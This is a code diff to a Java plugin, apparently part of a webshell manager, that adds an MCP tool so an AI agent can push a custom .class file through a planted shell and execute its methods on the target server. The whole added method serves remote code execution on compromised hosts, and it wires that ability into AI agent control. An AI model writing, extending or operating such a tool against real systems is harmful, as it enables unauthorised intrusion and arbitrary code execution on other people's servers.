@@ -30,6 +30,9 @@ import javax.swing.filechooser.FileNameExtensionFilter;
 import util.Log;
 import util.automaticBindClick;
 import util.http.ReqParameter;
+import core.annotation.McpTool;
+import core.annotation.McpParam;
+import java.util.Map;
 
 @PluginAnnotation(
         payloadName = "JavaDynamicPayload",
@@ -157,6 +160,31 @@ public class ClassLoader implements Plugin {
         ReqParameter reqParameter = new ReqParameter();
         byte[] resultByteArray = this.payload.evalFunc(this.actualClassName, methodName, reqParameter);
         return this.encoding.Decoding(resultByteArray);
+    }
+
+    @McpTool(name = "run", desc = "加载自定义 class 到目标并执行方法 (综合类加载执行; localPath 提供则先 include 再 evalFunc)", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
+            @McpParam(name = "className", required = true, desc = "目标类名, 如: plugin.MyClass"),
+            @McpParam(name = "localPath", desc = "本地 .class 文件路径 (可选, 提供则先加载到目标)"),
+            @McpParam(name = "methodName", defaultValue = "run", desc = "要执行的方法名") })
+    public String mcpRun(Map<String, Object> args) {
+        String localPath = args.get("localPath") == null ? null : String.valueOf(args.get("localPath"));
+        String className = String.valueOf(args.get("className"));
+        String methodName = String.valueOf(args.getOrDefault("methodName", "run"));
+        if (className == null || className.trim().isEmpty()) return "缺少参数: className";
+        try {
+            if (localPath != null && !localPath.trim().isEmpty()) {
+                File f = new File(localPath);
+                if (!f.isFile()) return "本地文件不存在: " + localPath;
+                byte[] data = Files.readAllBytes(f.toPath());
+                if (!this.payload.include(className, data)) return "类加载失败: " + className;
+            }
+            ReqParameter reqParameter = new ReqParameter();
+            byte[] result = this.payload.evalFunc(className, methodName, reqParameter);
+            return this.encoding.Decoding(result);
+        } catch (Exception e) {
+            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+        }
     }
 
     public void init(ShellEntity shellEntity) {
